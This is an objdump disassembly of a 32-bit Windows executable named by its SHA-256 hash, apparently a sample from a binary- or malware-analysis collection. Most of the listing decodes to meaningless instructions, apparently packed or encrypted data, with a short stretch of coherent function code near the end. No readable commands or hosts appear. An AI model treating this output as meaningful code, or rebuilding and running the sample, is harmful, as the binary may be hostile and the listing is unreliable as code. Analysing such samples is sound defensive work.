
b4e20d922f366beb54e101a182c525afba390d49f3fbe39c7e91862809ec6c63.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jo     0x4d005a
  4d0002:	test   BYTE PTR [ecx-0x40e7e93d],cl
  4d0008:	(bad)  
  4d0009:	out    dx,eax
  4d000a:	ins    DWORD PTR es:[edi],dx
  4d000b:	pop    ebx
  4d000c:	icebp  
  4d000d:	loop   0x4cfff6
  4d000f:	mov    eax,0xe04980de
  4d0014:	or     al,0x64
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	int    0x38
  4d06c2:	lahf   
  4d06c3:	inc    edx
  4d06c4:	sar    DWORD PTR [ebx],1
  4d06c6:	mov    BYTE PTR [eax+edx*4],0xed
  4d06ca:	mul    DWORD PTR [ebp+0x27]
  4d06cd:	aaa    
  4d06ce:	ss mov dl,0x23
  4d06d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d06d2:	cwde   
  4d06d3:	into   
  4d06d4:	fild   WORD PTR [edx+0x1a77cfc9]
  4d06da:	mov    dl,0xf
  4d06dc:	add    eax,0x95c259f7
  4d06e1:	pop    ecx
  4d06e2:	imul   ebp,DWORD PTR [ebx-0x7a],0x85049030
  4d06e9:	sub    al,0xb
  4d06eb:	pop    ecx
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x44
  4d06f4:	lea    edi,[ebx+0x1c]
  4d06f7:	sub    edx,edi
  4d06f9:	push   edi
  4d06fa:	push   DWORD PTR [edi+0x1c]
  4d06fd:	push   DWORD PTR [edi+0x4]
  4d0700:	push   esi
  4d0701:	push   DWORD PTR [edi+0x100]
  4d0707:	call   0x4d1148
  4d070c:	add    esp,0x10
  4d070f:	pop    edi
  4d0710:	push   edi
  4d0711:	call   0x4d151c
  4d0716:	add    esp,0x4
  4d0719:	pop    edi
  4d071a:	push   edi
  4d071b:	push   0x0
  4d071d:	call   0x4d08bc
  4d0722:	add    esp,0x4
  4d0725:	pop    edi
  4d0726:	add    esp,0x44
  4d0729:	pop    ebp
  4d072a:	ret    
  4d072b:	add    BYTE PTR [edi-0x1],bl
  4d072e:	adc    eax,0x4d2030
  4d0733:	call   edi
  4d0735:	add    BYTE PTR [eax],al
  4d0737:	add    BYTE PTR [edi-0x1],bl
  4d073a:	adc    eax,0x4d203c
  4d073f:	call   edi
  4d0741:	add    BYTE PTR [eax],al
  4d0743:	add    BYTE PTR [edi-0x1],bl
  4d0746:	adc    eax,0x4d2040
  4d074b:	call   edi
  4d074d:	add    BYTE PTR [eax],al
  4d074f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0755:	sub    esp,0x50
  4d0758:	lea    eax,[ebx-0x78]
  4d075b:	and    DWORD PTR [eax-0x24],ecx
  4d075e:	push   eax
  4d075f:	mov    ecx,0x0
  4d0764:	push   ecx
  4d0765:	call   0x4d0af8
  4d076a:	add    esp,0x4
  4d076d:	pop    eax
  4d076e:	push   eax
  4d076f:	push   DWORD PTR [eax+0xfc]
  4d0775:	push   edx
  4d0776:	push   DWORD PTR [eax+0x1c0]
  4d077c:	call   0x4d0a18
  4d0781:	add    esp,0xc
  4d0784:	pop    eax
